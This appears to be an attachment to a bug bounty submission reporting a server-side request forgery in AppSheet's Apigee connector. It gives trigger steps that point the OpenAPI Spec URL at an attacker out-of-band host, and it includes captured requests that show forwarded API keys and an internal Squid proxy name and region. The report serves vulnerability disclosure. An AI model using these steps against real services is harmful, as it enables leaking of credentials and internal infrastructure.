# Attachment 2 — Surface 2: Apigee API Connector (OpenAPI Spec URL) HTTP SSRF
# AppSheet Systemic SSRF (F003) — Google VRP Submission
# Reporter: azmolhaque95@gmail.com | Date: 2026-06-19

---

## WHAT THIS PROVES

AppSheet's Apigee connector (OpenAPI Spec URL field) makes a live server-side HTTP request
from a GCP-origin IP to an attacker-controlled host, forwarding the user-supplied Apigee API
key (X-Apikey) and leaking the internal Squid proxy name and GCP deployment region via the
Via header.

---

## TRIGGER

1. Go to: https://appsheet.com/Account/ApigeeAuthInfo
2. Select tab: OpenAPI Spec
3. Authorization Type: ApiKey
4. Apigee API Key: <any value — forwarded verbatim>
5. OpenAPI Spec URL: https://<attacker-oob-host>
6. Click: Validate

---

## HTTP REQUEST RECEIVED AT ATTACKER OOB LISTENER

### Discovery session — 2026-06-16 20:59:14 UTC

```
GET / HTTP/1.1
Host: d8orfta69r82mdenbp8gfswz8ppxcwd6z.oast.pro
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Traceparent: 00-1d9706d9ddd9d0953779f8b8de0b8b55-ed79f904caf14ece-00
X-Apikey: Ahsisjsshsgyssuwhehdidieuwwysu
```

- Source IP:  35.233.152.59  →  GCP, AS15169 (different fleet node from Surface 1)
- DNS resolvers: 192.178.118.81, .94, .86, .83  →  Google, AS15169
- X-Apikey forwarded verbatim  ✓
- Traceparent: different trace ID from Surface 1  →  independent backend request confirmed
- HTTP client: Cache-Control: no-cache, no OData Accept header  →  third distinct client

---

### With Internal Squid Proxy Disclosure — 2026-06-18

```
GET / HTTP/1.1
Host: <OOB>
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Traceparent: 00-<trace-id>-<span-id>-00
X-Apikey: vrp-canary-apikey-2026
Via: 1.1 squid-proxy-open-api-us-west1-sqws (squid)
```

- Source IP:  8.231.222.130  →  GCP via internal Squid proxy egress
- Via header decoded:
    squid-proxy-open-api-us-west1-sqws
    │              │        │     │
    service-type   function region instance-id
  → Internal service name: squid-proxy
  → GCP region disclosed: us-west1
  → Service function: open-api (the OpenAPI spec fetcher)
  → Proxy type: Squid (internal reverse-proxy stack fingerprinted)

This header leaks AppSheet's internal GCP network topology and deployment region to any
attacker-controlled server receiving the Validate request.

---

### Pre-submission reconfirm — 2026-06-19 11:01:35 UTC

```
GET / HTTP/1.1
Host: d8qhv9269r87j64tn7r0dxjbtfhfrhxcj.oast.pro
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Traceparent: 00-6c735cdb7f16ea957f7ade6bc734581d-0a9421011552a4fd-00
X-Apikey: ApiKey012345678901234567890
```

- Source IP: 8.231.222.130  →  GCP via same internal Squid proxy (confirmed same egress)
- Confirmed same-day as submission

---

## RESPONSE ORACLE

AppSheet's UI error reflected the FULL HTML response body from the OOB server back to the browser:

  AppSheet UI error:
  "OpenAPI specification version '<html><head></head><body>jcxhrfhftbjxd0r7nt46j78r9629vhq8d</body></html>' is not supported"

This is a semi-blind SSRF with a full body oracle for responses the Apigee parser
attempts to read as OpenAPI JSON.

---

## REDIRECT TEST (HTTPS → HTTP blocked)

Tested 2026-06-19 with a live redirect server (302: https://<OOB> → http://<L2>):
- Apigee client returned: "Apigee error code: Found: Found"
- L2 (HTTP) listener received: zero hits
- Result: cross-scheme redirect BLOCKED on this surface

---

## DEDUP NOTE

Prior VRP report PnwRwydmr fixed the Apigee connector's API base URL / service endpoint path.
This finding uses the separate OpenAPI Spec URL field (different tab, different code path).
The same connector component has now produced two SSRF reports via different fields — direct
evidence that point-fixing individual fields is insufficient.
